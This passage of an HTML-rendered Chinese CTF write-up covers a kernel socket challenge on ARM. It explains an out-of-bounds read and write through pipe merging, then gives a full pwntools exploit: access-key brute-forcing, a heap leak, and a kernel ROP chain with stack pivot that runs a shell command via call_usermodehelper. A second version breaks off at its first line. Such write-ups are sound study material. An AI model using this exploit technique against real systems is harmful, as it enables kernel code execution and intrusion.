class="number">0</span>, PUREDATA_BLK);</span><br><span class="line">                reply(<span class="string">&quot;[+] create pure data success!\n&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;[+] create pure data success!\n&quot;</span>), csock);</span><br><span class="line">                bfree(buf);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>就是利用server的<code>0x20</code>选项来塞满管道，这里面就有<code>can_merge=1</code>的管道了，然后在全部<code>pop</code>出来，再push<code>0x10</code>权限，就可以让<code>0x10</code>的的管道的<code>can_merge=1</code>,然后就可以越界读和越界写了。最后写<code>*callback_func</code>指针来完成rop。</p>
<p>可是这是内核socket不像一般的内核题可以传一个程序上去，这该如何rop呢，学长的exp给了一个思路，内核中提供了一个<code>call_usermodehelper</code>函数，允许在内核态执行一个用户态的程序，而且参数接口和用户态的exec()系列函数是一样的，第一个参数是程序名，第二个参数是指针数组，存储着执行这个程序的命令行参数。</p>
<p>所以只要rop能够1控制<code>r0</code>和<code>r1</code>然后让<code>pc=</code>call_usermodehelper就好了。</p>
<p>值得注意的是我们要rop就得控制sp,让sp指向我们精心布置的堆块上，这其实直接破坏了程序的上下文，当执行完<code>call_usermodehelper</code>再从栈中寻找上下文恢复到原来调用处就会失败，所以rop首先得保存正常的<code>sp</code>地址，然后再栈迁移，最后再恢复<code>sp</code>。</p>
<p>所以对gadget的寻找还是有点苛刻的，我觉得不是很好找，当按着学长的gadget复现完之后，尝试自己在找见一套gadget,最后成功简化了一些学长的gadget。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>gadget未简化版</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">key=<span class="string">&#x27;&#x27;</span></span><br><span class="line">key_flag=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">        tmp_key=key+<span class="built_in">chr</span>(j)</span><br><span class="line">        tmp_key=tmp_key.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">        <span class="comment"># sh = process([&#x27;./wscat&#x27;, &#x27;--endpoint&#x27;, &#x27;wss://telnet.2022.capturetheflag.fun/ws/&#x27; + CHALLENGE_ID])</span></span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">        sh.send(tmp_key)</span><br><span class="line">        m=sh.recv(<span class="number">15</span>)</span><br><span class="line">        <span class="built_in">print</span> m</span><br><span class="line">        <span class="keyword">if</span> m == <span class="string">&#x27;auth success!!!&#x27;</span>:</span><br><span class="line">            key_flag=<span class="number">1</span></span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.recv(<span class="number">16</span>)</span><br><span class="line">        ture_num=u8(sh.recv(<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> ture_num-<span class="number">1</span>==i:</span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.close()</span><br><span class="line">    <span class="keyword">if</span> key_flag ==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span>(<span class="params">opt,<span class="built_in">len</span>=<span class="number">0</span>,context=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello server\n&quot;</span>)</span><br><span class="line">    sh.send(opt)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x30&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]this is puredata\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x10&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]say hello\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt ==<span class="string">&#x27;\x20&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]do opt func\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span>():</span></span><br><span class="line">    sh=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello client\n&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    data=sh.recv()</span><br><span class="line">    sh.close()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_change</span>(<span class="params">payload,<span class="built_in">str</span>,idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> payload[<span class="number">0</span>:idx]+<span class="built_in">str</span>+payload[idx+<span class="built_in">len</span>(<span class="built_in">str</span>):]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop</span>(<span class="params">heap,cmd</span>):</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x2000</span></span><br><span class="line">    stack=<span class="number">0x1000</span></span><br><span class="line">    save_sp=<span class="number">0x1500</span></span><br><span class="line">    agr=<span class="number">0x1700</span></span><br><span class="line">    sl=<span class="number">0x1800</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;/bin/sh\x00&quot;</span>,agr)</span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;-c&quot;</span>,agr+<span class="number">0x10</span>)</span><br><span class="line">    payload=str_change(payload,cmd,agr+<span class="number">0x20</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr),agr+<span class="number">0x100</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x10</span>),agr+<span class="number">0x100</span>+<span class="number">4</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x20</span>),agr+<span class="number">0x100</span>+<span class="number">8</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8051ef90:	ldr	r3, [r0, #400]	; 0x190</span></span><br><span class="line"><span class="string">    0x8051ef94:	ldr	r2, [r3, #124]	; 0x7c</span></span><br><span class="line"><span class="string">    0x8051ef98:	cmp	r2, #0</span></span><br><span class="line"><span class="string">    0x8051ef9c:	beq	0x8051efb0</span></span><br><span class="line"><span class="string">    0x8051efa0:	blx	r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x190</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8049dd4c</span>),<span class="number">0x7c</span>)  <span class="comment">#r2</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8049dd4c &lt;hvc_push+12&gt;    ldr    r2, [r0, #0xec]</span></span><br><span class="line"><span class="string">    0x8049dd50 &lt;hvc_push+16&gt;    ldr    r1, [r0, #0xe4]</span></span><br><span class="line"><span class="string">    0x8049dd54 &lt;hvc_push+20&gt;    ldr    r3, [r3, #4]</span></span><br><span class="line"><span class="string">    0x8049dd58 &lt;hvc_push+24&gt;    ldr    r0, [r0, #0xf0]</span></span><br><span class="line"><span class="string">    0x8049dd5c &lt;hvc_push+28&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x802d4d18</span>),<span class="number">0xec</span>)  <span class="comment">#r2</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0xe4</span>)  <span class="comment">#r1</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0x4</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0xf0</span>)  <span class="comment">#r0</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80694958 &lt;rpcauth_list_flavors+76&gt;     mov    r0, sp</span></span><br><span class="line"><span class="string">    0x8069495c &lt;rpcauth_list_flavors+80&gt;     blx    r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x802d4d18 &lt;nfs_pgio_result+8&gt;     ldr    r3, [r1, #0x3c]</span></span><br><span class="line"><span class="string">    0x802d4d1c &lt;nfs_pgio_result+12&gt;    mov    r5, r0</span></span><br><span class="line"><span class="string">    0x802d4d20 &lt;nfs_pgio_result+16&gt;    ldr    r2, [r1]</span></span><br><span class="line"><span class="string">    0x802d4d24 &lt;nfs_pgio_result+20&gt;    ldr    r3, [r3, #0xc]</span></span><br><span class="line"><span class="string">    0x802d4d28 &lt;nfs_pgio_result+24&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x3c</span>) <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(heap+stack),<span class="number">0</span>)  <span class="comment"># r2</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c03c</span>),<span class="number">0xc</span>) <span class="comment">#r3</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c03c &lt;cpu_suspend_abort+12&gt;         mov    sp, r2</span></span><br><span class="line"><span class="string">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(save_sp+heap),stack)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8017c0f0</span>),stack+<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8017c0f0 &lt;tick_handover_do_timer+76&gt;    str    r0, [r4]</span></span><br><span class="line"><span class="string">    0x8017c0f4 &lt;tick_handover_do_timer+80&gt;    pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">10</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                                pop    &#123;r1, r2, r3&#125;</span></span><br><span class="line"><span class="string">    0x804282e8                                sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                                rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                                pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0</span>),stack+<span class="number">4</span>*<span class="number">11</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0</span>),stack+<span class="number">4</span>*<span class="number">12</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">13</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c020</span>),stack+<span class="number">4</span>*<span class="number">15</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    &#123;r0, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80136dec</span>),stack+<span class="number">4</span>*<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80136dec &lt;module_attr_show+32&gt;          pop    &#123;lr&#125;</span></span><br><span class="line"><span class="string">    0x80136df0 &lt;module_attr_show+36&gt;          bx     r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                          pop    &#123;r1, r2, r3&#125;</span></span><br><span class="line"><span class="string">    0x804282e8                          sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                          rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                          pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c040</span>),stack+<span class="number">4</span>*<span class="number">19</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+save_sp-<span class="number">0x24</span>),stack+<span class="number">4</span>*<span class="number">22</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8022b754</span>),stack+<span class="number">4</span>*<span class="number">23</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8022b754 &lt;dio_complete+120&gt;    ldr    ip, [r4, #0x24]</span></span><br><span class="line"><span class="string">    0x8022b758 &lt;dio_complete+124&gt;    stm    sp, &#123;r7, ip&#125;</span></span><br><span class="line"><span class="string">    0x8022b75c &lt;dio_complete+128&gt;    blx    r1 </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125; &lt;0x8010c040&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+sl),stack+<span class="number">4</span>*<span class="number">30</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                                pop    &#123;r1, r2, r3&#125;                  &lt;0x8010c040&gt;</span></span><br><span class="line"><span class="string">    0x804282e8                                sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                                rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                                pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x100</span>),stack+<span class="number">4</span>*<span class="number">33</span>)  <span class="comment">#r1</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c020</span>),stack+<span class="number">4</span>*<span class="number">37</span>)  <span class="comment">#pc</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    &#123;r0, pc&#125;                      &lt;0x8010c020&gt;=</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr),stack+<span class="number">4</span>*<span class="number">38</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80101524</span>),stack+<span class="number">4</span>*<span class="number">39</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80101524 &lt;secondary_startup_arm+100&gt;    mov    sp, ip</span></span><br><span class="line"><span class="string">    0x80101528 &lt;secondary_startup_arm+104&gt;    ldr    ip, [sl, #0x10]</span></span><br><span class="line"><span class="string">    0x8010152c &lt;secondary_startup_arm+108&gt;    add    ip, ip, sl</span></span><br><span class="line"><span class="string">    0x80101530 &lt;secondary_startup_arm+112&gt;    mov    pc, ip</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    call_usermodehelper=<span class="number">0x8012f990</span></span><br><span class="line">    offsets=(call_usermodehelper-(heap+sl))&amp;<span class="number">0xffffffff</span></span><br><span class="line">    payload=str_change(payload,p32(offsets),sl+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        server(<span class="string">&#x27;\x20&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        client()</span><br><span class="line">    </span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    client()</span><br><span class="line">    client()</span><br><span class="line">    data=client()</span><br><span class="line">    heap=u32(data[<span class="number">7</span>:<span class="number">7</span>+<span class="number">4</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">    cmd=<span class="string">&#x27;echo hello1 &gt; /tmp/hacked&#x27;</span></span><br><span class="line">    payload=rop(heap,cmd)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x2000</span>,payload)</span><br><span class="line"></span><br><span class="line">    payload=p32(<span class="number">0x8051ef90</span>)+p32(heap)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x1000</span>+<span class="number">0xfff</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1ffc</span>,payload)</span><br><span class="line">    client()</span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简化版</p>
<p>也就简化了20行😢</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> 